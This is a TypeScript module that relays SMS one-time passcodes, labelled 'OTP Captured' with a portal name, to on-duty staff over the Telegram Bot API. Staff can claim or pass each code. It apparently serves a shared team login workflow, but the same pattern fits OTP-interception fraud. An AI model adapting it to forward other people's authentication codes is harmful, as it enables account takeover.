/// <reference types="node" />
import { OnDutyStaff } from './supabase.service';

const TELEGRAM_API = 'https://api.telegram.org/bot';

export interface OtpPushResult {
  staff_id: string;
  chat_id: string;
  ok: boolean;
  error?: string;
}

/**
 * Pushes an OTP notification to a staff member's Telegram chat.
 * Uses the same bot token as telegram-bot (TELEGRAM_BOT_TOKEN).
 * Returns the result of each push so the caller can log failures.
 */
export async function pushOtpToStaff(
  staff: OnDutyStaff,
  otpCode: string,
  portal: string,
  smsPreview: string
): Promise<OtpPushResult> {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (!token) {
    return {
      staff_id: staff.id,
      chat_id: staff.telegram_chat_id ?? '',
      ok: false,
      error: 'TELEGRAM_BOT_TOKEN not configured',
    };
  }
  if (!staff.telegram_chat_id) {
    return {
      staff_id: staff.id,
      chat_id: '',
      ok: false,
      error: 'staff has no telegram_chat_id',
    };
  }

  const text = [
    `🔐 *OTP Captured* [${portal.toUpperCase()}]`,
    '',
    `Code: \`${otpCode}\``,
    '',
    `_SMS:_ ${smsPreview.slice(0, 120)}`,
    '',
    'Reply /claim to use it. Pass with /pass.',
  ].join('\n');

  try {
    const res = await fetch(`${TELEGRAM_API}${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: staff.telegram_chat_id,
        text,
        parse_mode: 'Markdown',
      }),
    });
    const body = (await res.json()) as { ok: boolean; description?: string };
    return {
      staff_id: staff.id,
      chat_id: staff.telegram_chat_id,
      ok: body.ok,
      error: body.ok ? undefined : body.description,
    };
  } catch (err) {
    return {
      staff_id: staff.id,
      chat_id: staff.telegram_chat_id,
      ok: false,
      error: err instanceof Error ? err.message : String(err),
    };
  }
}

/**
 * Broadcast an OTP to all on-duty staff for a given org. Returns
 * the per-staff results; does not throw on individual failures.
 */
export async function broadcastOtp(
  staff: OnDutyStaff[],
  otpCode: string,
  portal: string,
  smsPreview: string
): Promise<OtpPushResult[]> {
  return Promise.all(
    staff.map((s) => pushOtpToStaff(s, otpCode, portal, smsPreview))
  );
}
